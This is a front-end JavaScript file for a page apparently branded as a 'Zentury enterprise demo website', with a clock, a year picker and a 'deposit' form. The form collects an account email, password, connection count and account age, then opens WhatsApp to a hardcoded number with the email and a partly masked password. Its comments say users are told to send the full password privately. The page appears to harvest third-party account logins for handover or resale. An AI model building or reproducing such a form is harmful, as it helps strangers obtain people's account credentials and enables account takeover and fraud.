// Enhanced schedule countdown, UI helpers, and WhatsApp deep-link builder
(function(){
  function qs(s){return document.querySelector(s)}
  function qsa(s){return document.querySelectorAll(s)}

  // Populate year select
  var yearSelect = qs('select[name=year]')
  if(yearSelect){
    var thisYear = new Date().getFullYear()
    for(var y=thisYear;y>=2006;y--){
      var opt = document.createElement('option'); opt.value = y; opt.textContent = y; yearSelect.appendChild(opt)
    }
  }

  // Friendly schedule note (keeps original behaviour but clearer to users)
  var countdownEl = qs('#countdown')
  function updateScheduleNote(){
    if(!countdownEl) return
    countdownEl.textContent = 'Form window: Thursday — Tuesday, 20:00 — 08:30 WIB (UTC+7). Payments processed Wednesday — Friday (night).'
  }
  updateScheduleNote()

  // Scroll to deposit section
  var openBtn = qs('#open-deposit-form')
  if(openBtn){openBtn.addEventListener('click', function(){
    document.getElementById('deposit-section').scrollIntoView({behavior:'smooth'})
  })}

  // Helper: mask password for display (never send raw passwords in messages)
  function maskPassword(pw){
    if(!pw) return ''
    return pw.split('').map(function(c,i){return i<2 ? c : '*'}).join('')
  }

  // Build WhatsApp deep link with prefilled (safe) message
  function buildWhatsAppLink(data){
    // Always avoid sending raw passwords in prefilled messages. We ask users to provide only masked password
    var lines = []
    lines.push('New deposit submission from Zentury enterprise demo website')
    lines.push('Account email: ' + data.email)
    lines.push('Password (masked): ' + data.passwordMasked)
    lines.push('Connections: ' + data.connections)
    lines.push('Account created: ' + data.month + ' ' + data.year)
    if(data.notes) lines.push('Notes: ' + data.notes)
    var text = lines.join('\n')
    var encoded = encodeURIComponent(text)
    // Replace the phone below with your admin WhatsApp number in international format.
    var adminPhone = '447432634043'
    return 'https://wa.me/' + adminPhone + '?text=' + encoded
  }

  // Basic submit handler: validates and opens WhatsApp with prefilled message
  var form = qs('#deposit-form')
  if(form){
    form.addEventListener('submit', function(e){
      e.preventDefault()
      var formData = new FormData(form)
      var email = (formData.get('email') || '').trim()
      var password = (formData.get('password') || '').trim()
      var connections = (formData.get('connections') || '').trim()
      var year = formData.get('year') || ''
      var month = formData.get('month') || ''

      // Minimal validation
      if(!email || !password || !connections){
        alert('Please fill email, password, and connections to continue.')
        return
      }

      // IMPORTANT: we DO NOT send raw passwords via prefilled WhatsApp messages for privacy.
      // Instead we include a masked version and instruct the user to send the full password privately
      var masked = maskPassword(password)

      var payload = {
        email: email,
        passwordMasked: masked,
        connections: connections,
        year: year,
        month: month,
        notes: ''
      }

      var wa = buildWhatsAppLink(payload)
      // Open WhatsApp link in a new tab/window
      window.open(wa, '_blank')
    })
  }

  // Small utility: allow resetting the form
  var resetBtn = qs('button[type=reset]')
  if(resetBtn){ resetBtn.addEventListener('click', function(){ form.reset() }) }

})()


function updateClock() {
      const now = new Date();
      const hours = now.getHours();
      const minutes = now.getMinutes();
      const seconds = now.getSeconds();

      const hourDeg = (hours % 12) * 30 + minutes / 2;
      const minDeg = minutes * 6;
      const secDeg = seconds * 6;

      document.getElementById('clock-hour-hand').style.transform = `rotate(${hourDeg}deg)`;
      document.getElementById('clock-minute-hand').style.transform = `rotate(${minDeg}deg)`;
      document.getElementById('clock-second-hand').style.transform = `rotate(${secDeg}deg)`;

      document.getElementById('current-time').textContent = now.toLocaleTimeString('en-GB', { hour12: false });
      document.getElementById('current-time-display').textContent = now.toLocaleString('en-US', {
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
        hour: 'numeric', minute: '2-digit', second: '2-digit'
      });
    }
    setInterval(updateClock, 1000);
    updateClock();